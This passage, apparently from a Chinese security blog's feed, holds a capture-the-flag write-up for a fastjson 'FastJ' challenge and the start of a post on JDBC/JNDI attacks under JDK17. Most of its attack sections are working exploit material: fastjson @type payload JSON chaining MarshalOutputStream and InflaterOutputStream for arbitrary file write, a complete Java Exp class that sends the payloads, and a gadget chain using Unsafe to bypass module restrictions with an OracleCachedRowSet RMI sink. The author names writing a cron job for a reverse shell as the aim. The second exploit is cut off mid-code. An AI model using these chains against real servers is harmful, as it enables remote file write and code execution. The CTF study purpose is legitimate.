21.37.04">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/截屏2024-11-07</a> 21.37.04.png)</p><h4 id="Step4-触发恶意类加载"><a href="#Step4-触发恶意类加载" class="headerlink" title="Step4: 触发恶意类加载"></a>Step4: 触发恶意类加载</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.chenzai.HackException&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是可以看到，他打的是common-io。本题的JDK是11，有什么意义呢？</p><p>然而JDK11自带符号信息，可以调用任意构造函数。猜测还是利用OutputStream下的子类实现<strong>任意文件写</strong>。</p><p>而且题目看似多此一举的给了一个<code>FilterFileOutputStream</code>：</p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611194236153.png" class="" title="image-20250611194236153"><p>题目那个getflag()不能直接读，估计就是给你提示到用这个<code>FilterFileOutputStream</code>的。这道题其实是写定时任务反弹shell的，也是常见的写文件R方法。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="1、缓存OutputStream"><a href="#1、缓存OutputStream" class="headerlink" title="1、缓存OutputStream"></a>1、<strong>缓存OutputStream</strong></h4><h5 id="fastjson的类缓存机制"><a href="#fastjson的类缓存机制" class="headerlink" title="fastjson的类缓存机制"></a>fastjson的类缓存机制</h5><p>Fastjson的类缓存机制：<code>ParserConfig.classMapping</code></p><p>当使用 @type 加载了一个类，Fastjson 会把它缓存起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">classMapping.put(typeName, clazz);<br></code></pre></td></tr></table></figure><p>这是为了提升解析性能、减少重复反射。</p><p>所以，<strong>只要你通过</strong> <strong>@type</strong> <strong>加载了某个类</strong>，Fastjson 后续就可以：</p><p>复用这个 Class 实例，并且不再检查autoType（因为已经被认为是“合法的”了） </p><p>缓存机制由来：  </p><ul><li><p>该机制很早就有（至少在 1.2.6+ 就存在），本是出于性能目的 </p></li><li><p>后来被用于各种 Gadget 利用链中作为“class 引导缓存”技巧</p></li></ul><p>（参考：<a href="https://xz.aliyun.com/news/18127">2025京麒杯web-先知社区</a>）</p><p>根据缓存InputStream的利用，我们可以找到fastjson的缓存OutputStream的gadget，一直抡到触发Exception：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.fasterxml.jackson.core.json.UTF8JsonGenerator<br>com.fasterxml.jackson.core.JsonGenerator<br>com.fasterxml.jackson.core.JsonGenerationException<br>java.lang.Exception<br></code></pre></td></tr></table></figure><p>于是可以依葫芦画瓢得出第一个json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerationException\&quot;, \&quot;g\&quot;: &#123;&#125; &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a.a&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerator\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8JsonGenerator\&quot;, \&quot;out\&quot;: &#123;&#125; &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;d&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.c.c&quot;</span> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2、任意文件写"><a href="#2、任意文件写" class="headerlink" title="2、任意文件写"></a>2、<strong>任意文件写</strong></h4><p>fastjson虽然再1.2.80禁用了<code>FileOutputStream</code>，但还记得题目给出的<code>FilterFileOutputStream</code>吗？接下来可以结合rmb实现任意文件写。</p><h5 id="rmb（RMI-Based-MarshalOutputStream）"><a href="#rmb（RMI-Based-MarshalOutputStream）" class="headerlink" title="rmb（RMI-Based MarshalOutputStream）"></a>rmb（<strong>RMI-Based MarshalOutputStream</strong>）</h5><p>是 JDK 自带的一个类：<code>sun.rmi.server.MarshalOutputStream</code></p><p>它是ObjectOutputStream 的子类；并且在对象序列化过程中，<strong>会调用其内部 OutputStream 的 write 方法</strong>；也是 JDK RMI 模块中用于序列化对象时的工具类。</p><p>那么我们就可以利用反序列化触发write()，实现数据流写入。</p><h5 id="InflaterOutputStream"><a href="#InflaterOutputStream" class="headerlink" title="InflaterOutputStream"></a>InflaterOutputStream</h5><p>标准 JDK 类，负责接收压缩数据 → 解压 → 向底层流写入</p><p>所以第二个json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.OutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.app.FilterFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;path&#125;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;ABC&#125;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;limit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;ABCD&#125;&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>调用getflag()会触发<code>new FilterFileOutputStream(&quot;/flag&quot;, &quot;/&quot;)</code>。</p><p>而触发调用<code>FilterFileOutputStream</code>类，就会让构造函数调用 super(name) ➜ 调用 FileOutputStream(String name) ➜ <strong>会尝试打开或新建这个文件</strong></p><p>由此结合后续write任意写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Fastjson <span class="hljs-title function_">parse</span><span class="hljs-params">()</span><br>  ↓<br>MarshalOutputStream.readObject()<br>  ↓<br>InflaterOutputStream<br>     └── infl.input.array → base64压缩数据<br>     └── infl.limit → 解压后长度<br>  ↓<br>FilterFileOutputStream → 文件创建并写入<br></code></pre></td></tr></table></figure><p>生成array压缩流即可:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123123123123&quot;</span>;<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-keyword">try</span> (<span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream)) &#123;<br>    deflaterOutputStream.write(input.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br><span class="hljs-type">int</span> <span class="hljs-variable">leng</span> <span class="hljs-operator">=</span> byteArrayOutputStream.toByteArray().length;<br>System.out.println(encoded);<br></code></pre></td></tr></table></figure><p>limit设置为解压缩后byte的length。</p><p>借用mini-venom队的wp,成功实现任意文件写:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">sendJson</span><span class="hljs-params">(String payload)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();<br><br>        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">httpHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();<br>        httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);<br><br>        LinkedMultiValueMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMultiValueMap</span>&lt;&gt;();<br>        map.add(<span class="hljs-string">&quot;json&quot;</span>, payload);<br><br>        HttpEntity&lt;LinkedMultiValueMap&lt;Object, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(map, httpHeaders);<br><br>        <span class="hljs-keyword">return</span> restTemplate.postForObject(target, request, String.class);<br>    &#125; <span class="hljs-keyword">catch</span> (RestClientException e) &#123;<br>        <span class="hljs-keyword">return</span><span class="hljs-string">&quot;null&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException, InterruptedException &#123;<br>    <span class="hljs-comment">// 1. add inputStream to fastjson cache</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payloads/step1.json&quot;</span>)));<br>    sendJson(payload1);<br>    System.out.println(payload1);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/eddie.txt&quot;</span>;<br>    <span class="hljs-comment">//String path = &quot;F:\\CTF_Java\\FastJ\\lib\\eddie.txt&quot;;</span><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;EddieMurphy_You_Bet&quot;</span>;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream)) &#123;<br>        deflaterOutputStream.write(input.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>    <span class="hljs-type">int</span> <span class="hljs-variable">leng</span> <span class="hljs-operator">=</span> byteArrayOutputStream.toByteArray().length;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payloads/step2.json&quot;</span>)));<br>    payload2 = payload2.replace(<span class="hljs-string">&quot;&#123;ABC&#125;&quot;</span>, encoded).replace(<span class="hljs-string">&quot;\&quot;&#123;ABCD&#125;\&quot;&quot;</span>,String.valueOf(leng)).replace(<span class="hljs-string">&quot;&#123;path&#125;&quot;</span>,path);<br>    sendJson(payload2);<br>    System.out.println(payload2);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611195649367.png" alt="image-20250611195649367"></p><p>参考链接:</p><p><a href="https://www.cnblogs.com/symv1a/p/18900307/2025-jingqi-ctf-preliminary-competitionweb-z108qvu">2025京麒CTF初赛-web - symya - 博客园</a></p><p><a href="https://xz.aliyun.com/news/18127">2025京麒杯web-先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/mN_0eiTt-6ToTuRsjt-mrA">2025第三届京麒CTF挑战赛 writeup by Mini-Venom</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道题可以学习一波，但貌似windows不能直接写成功，不知道是不是我机器配的权限原因。Linux就随便打了。</p><p>后续更一个JDBC不出网RCE的复现。</p><p>但是最近忙着保研一堆事,还要打工😭😭😭,所以更不勤了……</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>来自三道高版本JDK的JDBC连打combo</title>
    <link href="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/"/>
    <url>/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>鸽了太久，上周打了个软件安全赛半决，发现很多好玩的高版本JDK的JDBC题目，遂趁着没啥事的时候看看。</p><h1 id="其一-软件安全赛初赛-JDBCParty"><a href="#其一-软件安全赛初赛-JDBCParty" class="headerlink" title="其一-软件安全赛初赛-JDBCParty"></a>其一-软件安全赛初赛-JDBCParty</h1><p>JDK17打oracle的反序列化。</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331162957099.png" alt="image-20250331162957099"></p><p>入口很simple，因为getConnection内我们可控的只有username和password，所以不能直接打JDBC了。</p><p>前面给了个deserialize，应该是打这里的反序列化：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331163110482.png" alt="image-20250331163110482"></p><p>这里的打法不仅仅是高版本JDK下JDBC的打法，打JDBC前半段很简单，都是找个能触发到<code>getConnection</code>的链，这里有很多种选择，比如出道即巅峰的<code>EventListenerList</code>，其二是<code>hashtable</code>，都可以从<code>toString</code>调用到任意getter。</p><p>后半段就是着重考虑的高版本JDK的JNDI打法。</p><p>饭要一口口吃，路要一步步走。我们先看JDBC怎么打。</p><p>首先就是JDK17的反射机制绕过，这里可以看：</p><p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/">JDK17+反射限制绕过</a></p><p>根据 <a href="https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B">Oracle的文档</a>，为了安全性，从JDK 17开始对java本身代码使用强封装，原文叫 <code>Strong Encapsulation</code>。任何对 <code>java.*</code> 代码中的<strong>非public</strong>变量和方法进行反射会抛出<code>InaccessibleObjectException</code>异常。</p><p>这里我们是使用了Unsafe类来实现反射限制的突破。本质上即为在jdk17及之后无法反射 <code>java.*</code> 包下非<code>public</code> 修饰的属性和方法，通过 <code>UnSafe</code>实现<strong>调用类的module和Object类的module一样</strong> 达到可以修改的目的，具体不再赘述。</p><p>对于高版本JDK的JNDI的话，我们需要找到能触发getter的JNDI。</p><p>这个项目也已经给出：<a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>oracle数据库我们可以选择<code>OracleCachedRowSet</code>作为sink：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br>oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://localhost:1097/remoteobj&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个sink的首坑是只能打RMI。我们跟一下<code>OracleRowSet</code>可以看到黑名单：</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331164035491.png" alt="image-20250331164035491"></p><p>唯独RMI没ban。</p><h3 id="EXP-JDBC到JNDI"><a href="#EXP-JDBC到JNDI" class="headerlink" title="EXP-JDBC到JNDI"></a>EXP-JDBC到JNDI</h3><p>此处就以那位出道即巅峰的<code>EventListenerList</code>下手，借用一部分j1rry师傅的代码，注意还是要先把Jackson链中的<code>writeReplace</code>给删了，不然会提前触发就打印不出payload了，同时记得添加VM Options：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp_EventListenerList</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, <span class="hljs-literal">false</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> Object.class.getModule();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> Exp_EventListenerList.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(currentClass, addr, baseModule);<br>        <span class="hljs-comment">//User user = new User();</span><br>        <span class="hljs-comment">//对于是否触发到getter方法实现的时候 可以考虑本地实现一个类看看</span><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://localhost:1097/remoteobj&quot;</span>);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">MemoryUserDatabaseFactory</span>();<br><br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;monitorLock&quot;</span>),<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        vector1.add(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;111&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        vector2.add(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;222&quot;</span>);<br>        String[] metaData= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;222&quot;</span>&#125;;<br><br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;matchColumnIndexes&quot;</span>),vector1);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;matchColumnNames&quot;</span>),vector2);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;metaData&quot;</span>),metaData);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;reader&quot;</span>),<span class="hljs-literal">null</span>);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;writer&quot;</span>),<span class="hljs-literal">null</span>);<br>        UnSafeTools.setObject(oracleCachedRowSet,oracleCachedRowSet.getClass().getDeclaredField(<span class="hljs-string">&quot;syncProvider&quot;</span>),<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(oracleCachedRowSet);<br><br><br>        <span 